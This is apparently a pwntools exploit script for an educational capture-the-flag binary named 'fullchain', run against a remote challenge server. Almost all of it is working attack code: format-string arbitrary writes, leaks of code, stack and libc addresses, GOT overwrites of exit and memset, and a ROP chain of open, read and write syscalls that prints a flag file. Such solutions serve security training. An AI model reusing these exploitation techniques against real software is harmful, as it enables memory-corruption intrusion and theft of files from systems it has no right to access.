#!/usr/bin/python3
from pwn import *


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']



# r = process("./fullchain")
r = remote("edu-ctf.zoolab.org", 30201)
l = ELF("./fullchain")


# cnt 
def write_local(value):
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendline(value)

def write_global(value):
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendline(value)



def set_cnt(number = 1111):
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'write%p')
    line = r.recvuntil("global")
    line = line.decode()
    print("line",line)
    local_stack_address = int(line[5:5+14],16)
    print("******local_stack_address",hex(local_stack_address))
    cnt_address = local_stack_address - 12
    print("cnt_address",hex(cnt_address))
    # line = r.recvline()
    # print("line",line)

    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendline(b'A'*0x10 + p64(cnt_address))

    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'write%16$n') 


    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    payload = '%{}c%16$n\x00'.format(number)
    print("payload",payload)
    r.sendline(payload.encode())


    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')

 

def leak_local_buffer_address():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendline(b"%p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    local_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("----local_buffer_address",hex(local_buffer_address))

    # local_buffer_offset =    0x7fffcae27000 - 0x7fffcae25160
    # code_base_address = local_buffer_address + local_buffer_offset

    # print("code_base_address",hex(code_base_address))
    return local_buffer_address

def leakCodeBaseAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendline(b"%7$p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")


    global_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("global_buffer_address ",hex(global_buffer_address))

    global_buffer_offset =   0x56208192e0b0 - 0x56208192a000
    code_base_address = global_buffer_address - global_buffer_offset

    print("*****code_base_address",hex(code_base_address))
    return code_base_address

# r.sendlineafter("local > ",b'global')
def leakglobal_bufferAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60')
    r.send(b"%7$p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    global_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("global_buffer_address ",hex(global_buffer_address))
    return global_buffer_address



def callGets(code_base_address,libc_address,open_read_write_ROP_stack):
    # local_stack_address = leakStackBaseAddress()
    print("open_read_write_ROP_stack",hex(open_read_write_ROP_stack))


    pop_rdi_ret = 0x16d3 + code_base_address
    gets = 0x86af0 + libc_address
    chal= 0x146a + code_base_address
    pop_rsi_ret = 0x27529 + libc_address 
    pop_rdx_pop_rbx_ret = 0x162866   + libc_address
    pop_rax_ret = 0x4a550  + libc_address
    scanf = 0x1184 + code_base_address
    ret = 0x101a  + code_base_address
    print("scanf",hex(scanf))

    print("get address",hex(gets))

    #  pop_rdi_ret,3,
    #     pop_rsi_ret,fn,
    #     pop_rdx_ret,0x30,
    #     pop_rax_ret,0,
    #     syscall_ret,

    global_buffer_address = leakglobal_bufferAddress()
    # print("pop_rdi_ret",hex(pop_rdi_ret),"global_buffer_address",hex(global_buffer_address),"gets",hex(gets),"chal",hex(chal))
    print("pop_rdi_ret",hex(pop_rdi_ret),"open_read_write_ROP_stack",hex(open_read_write_ROP_stack),"gets",hex(gets),"chal",hex(chal))


    padding = b'A'*0x24 + b'\x00'*4+ b'A'*0x10
    rop = padding + flat(
        # pop_rdi_ret,open_read_write_ROP_stack,
        pop_rdi_ret,global_buffer_address,
        gets,
        chal
    )
    # print("rop",rop)
    print("len of padding",len(rop))
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",str(len(rop)+3).encode())
    r.sendline(rop)
    

    r.sendline('ffffff')
   
    return libc_address



def write_local(value):
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(value)


def write_global(value):
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(value)



# def fmt_write_two_byte(addr,value):
#     print("addr",addr,"value",value)
#     tmp_value= p64(value)

#     fmt_write_one_byte(addr,tmp_value[0])
#     fmt_write_one_byte(addr+1,tmp_value[1])


def fmt_write(addr,byte_value,num_of_byte=1):
    print("fmt addr",hex(addr),"byte_value",hex(byte_value))

    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendline(b'A'*0x10 + p64(addr))

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    if byte_value != 0:
        if num_of_byte== 1:
            payload = "%" + str(byte_value) + "c" + "%16$hhn\x00"
        elif num_of_byte == 2:
            payload = "%" + str(byte_value) + "c" + "%16$hn\x00"
        elif num_of_byte == 4:
            payload = "%" + str(byte_value) + "c" + "%16$n\x00"
    else:
        if num_of_byte== 1:
            payload = "%16$hhn\x00"
        elif num_of_byte == 2:
            payload = "%16$hn\x00"
        elif num_of_byte == 4:
            payload = "%16$n\x00"
    print("payload",payload)
    r.sendline(payload.encode())

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')

def fmt_write_address_final_two_byte(addr,value):
    tmp = value[0] * value[1]
    fmt_write(addr,tmp,2)

def write_24_byte_to_arbitrary_address(addr,value):
    print("24_byte_write addr",hex(addr),"value",value)
    r.sendlineafter("local > ",b"local")
    r.sendlineafter("write > ",b"dummy")

    fmt_write_address_final_two_byte(ptr_address,p64(addr))

    r.sendlineafter("local > ",b"fakePtr")
    r.sendlineafter("write > ",b"read")
    r.sendline(value)

    
def send_all_payload(start_address,payload):
    print("send_all start_address",hex(start_address),"payload",payload)
    if len(payload)%24 != 0:
        payload += (24 - (len(payload) % 24)) * b'\x00'
    for i in range(0,len(payload),24):
        curAddress = start_address + 24*i
        curPayload = payload[i:i+24]
        write_24_byte_to_arbitrary_address(curAddress,curPayload)
        
def fmt_send_payload(start_address,payload):
    print("fmt_send_payload start_addr",hex(start_address),"payload",payload)
    for i in range(len(payload)):
        # if payload[i] == 0:
        #     continue
        # if i == 28:
        #     gdb.attach(r)
        print("-----fmt send payload")
        fmt_write(start_address+i,payload[i])
        print("address",hex(start_address+i),"i",i,"payload",hex(payload[i]))
    

def leakLibC():
    puts_got = 0x4030 + code_base_address
    puts_plt = 0x1130 + code_base_address
    pop_rdi = 0x1863  + code_base_address
    chal= 0x15c7 + code_base_address

    print("pop_rdi",hex(pop_rdi),"puts_got",hex(puts_got),"puts_plt",hex(puts_plt),"chal",hex(chal))

    rop = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(chal)
    fmt_send_payload(stack_return_address,rop)
    # 將cnt寫成0 
    # fmt_write(cnt_address,0,4)
    r.sendlineafter("local >","exit")
    # libc = u64(r.recvuntil(b"global").split(b'\n')[1].ljust(8,b"\x00")) - 0x00000000000875a0
    libc = u64(r.recvuntil(b"global").split(b'\n')[0][-6:].ljust(8,b'\x00')) - 0x875a0
    print("libc",hex(libc))
    set_cnt()
    # reset cnt
    # fmt_write(cnt_address,11111,4)
    return libc
    

    # send_all_payload(stack_return_address,rop)
    

def setStackSymbolsAddress(local_buffer_address):
    cnt_address = local_buffer_address - 12
    ptr_address = local_buffer_address - 8
    stack_return_address = local_buffer_address + 0x28
    print("---- cnt_address",hex(cnt_address),"ptr_address",hex(ptr_address),"stack_return_address",hex(stack_return_address))
    return cnt_address , ptr_address , stack_return_address

elf = ELF('./fullchain')

# buffer_overflow_cnt()
set_cnt()
code_base_address = leakCodeBaseAddress()
local_buffer_address = leak_local_buffer_address()
cnt_address , ptr_address , stack_return_address = setStackSymbolsAddress(local_buffer_address)

exit_got = code_base_address + 0x4070
# ptr_address = stack_base_address + 

ret = 0x101a + code_base_address
# ret = code_base_address + 0x101a
ret= p64(ret)
leave_ret = p64(code_base_address + 0x147c)
puts_got = code_base_address + 0x4030
chal = p64(code_base_address + elf.sym['chal'])
print("chal",chal)
memset_got = code_base_address + elf.got['memset']
print("memset_got",hex(memset_got))

# fmt_write(exit_got,ret_gadget[0]) 
# fmt_write(exit_got+1,ret_gadget[1])


fmt_write(exit_got,leave_ret[0])
fmt_write(exit_got+1,leave_ret[1])


libc = leakLibC()

print("******libc_address",hex(libc))
local_buffer_address = leak_local_buffer_address()
cnt_address , ptr_address , stack_return_address = setStackSymbolsAddress(local_buffer_address)

gets_address = libc + 0x86af0
print("gets_address",hex(gets_address))
gets_address = p64(gets_address)
print("memset_got",hex(memset_got))

# fmt_write(memset_got,gets_address[0])
# fmt_write(memset_got+1,gets_address[1])
fmt_send_payload(memset_got,gets_address)

# gdb.attach(r)

r.sendlineafter("local > ",b'local')
r.sendlineafter("write > ",b'set')
r.sendlineafter("data > ",b'1')
# 這邊後面加一個空白鍵 , 讓scanf繼續,如果是用sendlineafter 的話
# 雖然scanf會繼續,但是\n會留在裡面,所以接下來的gets會吃到\n而結束
r.sendafter("length > ",b'1 ')


pop_rsi_ret = 0x27529 + libc
pop_rdx_pop_rbx_ret = 0x162866   + libc
pop_rax_ret = 0x4a550  + libc
pop_rdi_ret = 0x26b72 + libc
syscall_ret = libc + 0x0000000000066229

payload = b"A"* 0x27

shall_string_address =  local_buffer_address + 0x30 + 21*0x8
payload += flat(

    pop_rdi_ret, shall_string_address,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,
    # chal

    pop_rdi_ret,3,
    pop_rsi_ret,local_buffer_address+0x8,
    pop_rdx_pop_rbx_ret,0x20,0,
    pop_rax_ret , 0,
    syscall_ret,

    pop_rdi_ret,1,
    pop_rax_ret,1,
    syscall_ret
)
payload += b"/home/fullchain/flag\x00"

r.sendline(payload)
r.sendlineafter("local >","exit")



r.interactive()

